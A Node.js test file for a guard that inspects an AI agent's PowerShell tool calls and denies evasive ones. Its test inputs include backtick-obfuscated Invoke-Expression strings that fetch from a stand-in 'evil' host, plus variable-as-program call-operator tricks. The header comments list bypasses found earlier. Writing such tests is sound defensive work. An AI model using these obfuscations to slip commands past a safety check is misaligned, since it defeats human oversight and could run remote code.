// __tests__/v4r2r10Hardening.test.mjs
//
// Anchor tests for v4-r2 ROUND-10 hardening:
//   1/3 HIGH (A) — backtick-strip regex `i` flag let UPPERCASE escape
//                  letters bypass (`i`Ex` → `iEx` → Invoke-Expression)
//   1/3 HIGH (B) — cloneWrapper used bare execFileSync("git", ...)
//                  without resolveTrustedProgram (planted-binary attack)
//   1/3 HIGH (C) — preserved double-quoted PS interpolation as program
//                  token (`& "$x" install`) not detected as synthesis
//   1/3 HIGH (C) — PR refType not propagated through safeListTreeHandler

import { test } from "node:test";
import assert from "node:assert/strict";

import { inspectToolCall, activateAudit, deactivateAudit } from "../enforcement.mjs";

const BUILD_ROOT = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck"
    : "/tmp/zerotrust-sourcecheck";
const CLONE_PATH = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck\\octocat-Hello-World-7fd1a60"
    : "/tmp/zerotrust-sourcecheck/octocat-Hello-World-7fd1a60";

function denyTest(name, command, mode = "audit_source") {
    test(name, () => {
        const sid = "v4r2r10-" + Math.random().toString(36).slice(2, 8);
        deactivateAudit(sid);
        activateAudit({
            sessionId: sid,
            buildPath: BUILD_ROOT,
            mode,
            expectedClonePath: CLONE_PATH,
        });
        const r = inspectToolCall({
            sessionId: sid,
            toolName: "powershell",
            toolArgs: { command },
        });
        assert.equal(r.decision, "deny",
            `expected deny, got: ${r.decision} | reason: ${r.reason || ""}`);
        deactivateAudit(sid);
    });
}

// ---- A-R10-1: uppercase escape letters bypass ----

denyTest("v4-r2-r10: `i`Ex 'foo'` (uppercase E mid-iex) is DENIED",
    "i`Ex 'curl http://evil/payload'");
denyTest("v4-r2-r10: `I`E`X 'foo'` (multiple uppercase) is DENIED",
    "I`E`X 'curl http://evil/payload'");
denyTest("v4-r2-r10: `Invoke-Expr`Ession 'foo'` (uppercase E) is DENIED",
    "Invoke-Expr`Ession 'curl http://evil'");
denyTest("v4-r2-r10: `invoke-expr`Ession 'foo'` (lowercase + uppercase mix) is DENIED",
    "invoke-expr`Ession 'curl http://evil'");

// ---- C-R10-1: preserved double-quoted PS interpolation as program token ----

denyTest('v4-r2-r10: `& "$x" install` (PS var as program token) is DENIED',
    '& "$x" install');
denyTest('v4-r2-r10: `& "${x}" install` (PS subexpression-style var) is DENIED',
    '& "${x}" install');
denyTest('v4-r2-r10: `. "$program"` (PS dot-source with var) is DENIED',
    '. "$program" something');
denyTest('v4-r2-r10: `& "$($pkg)" install` (preserved $() interp as program) is DENIED',
    '& "$($pkg)" install');

// Sanity: regular var-in-string usage NOT in command position should not trip
test("v4-r2-r10 sanity: `Write-Host \"hello $name\"` (var in display string) is ALLOWED", () => {
    const sid = "v4r2r10-allow-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: 'Write-Host "hello $name"' },
    });
    assert.notEqual(r.decision, "deny",
        `non-call-operator var interpolation should be allowed. got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

test("v4-r2-r10 sanity: `Write-Host \"line1`nline2\"` (legit `n) is ALLOWED", () => {
    const sid = "v4r2r10-nstr-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_source",
        expectedClonePath: CLONE_PATH,
    });
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: 'Write-Host "line1`nline2"' },
    });
    assert.notEqual(r.decision, "deny");
    deactivateAudit(sid);
});

// ---- B-R10-1: cloneWrapper resolveTrustedProgram (just verify import) ----

test("v4-r2-r10: cloneWrapper imports resolveTrustedProgram", async () => {
    const fs = await import("node:fs");
    const url = await import("node:url");
    const path = await import("node:path");
    const here = path.dirname(url.fileURLToPath(import.meta.url));
    const src = fs.readFileSync(
        path.join(here, "..", "safeWrappers", "cloneWrapper.mjs"),
        "utf-8",
    );
    assert.match(src, /import\s*{\s*resolveTrustedProgram\s*}\s*from\s*["']\.\/programResolver/,
        "cloneWrapper must import resolveTrustedProgram (parity with apiClient/install/build wrappers)");
    assert.match(src, /resolveTrustedProgram\s*\(\s*["']git["']/,
        "cloneWrapper must call resolveTrustedProgram for the git binary");
    // The bare `execFileSync("git", ...)` calls should be GONE.
    const bareGitCalls = (src.match(/execFileSync\(\s*["']git["']/g) || []).length;
    assert.equal(bareGitCalls, 0,
        `cloneWrapper must not have any bare execFileSync("git", ...) calls; found ${bareGitCalls}`);
});
